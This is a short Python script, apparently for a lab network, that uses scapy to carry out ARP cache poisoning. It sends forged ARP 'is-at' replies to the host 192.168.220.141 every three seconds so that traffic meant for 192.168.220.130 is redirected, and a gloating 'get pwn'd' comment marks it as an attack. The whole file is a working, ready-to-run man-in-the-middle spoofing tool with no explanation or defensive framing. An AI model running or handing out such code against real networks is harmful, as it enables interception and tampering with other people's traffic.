#!/usr/bin/python3

import string
from scapy.all import *
import signal
import sys

signal.signal(signal.SIGINT, lambda s, f: sys.exit(-1))	

target = "192.168.220.141"
redirect = "192.168.220.130" # hehehehe get pwn'd

poison = Ether()/ARP(pdst=target, psrc=redirect, op="is-at")

while True:
	sendp(poison, iface="enp0s3.104")
	time.sleep(3)

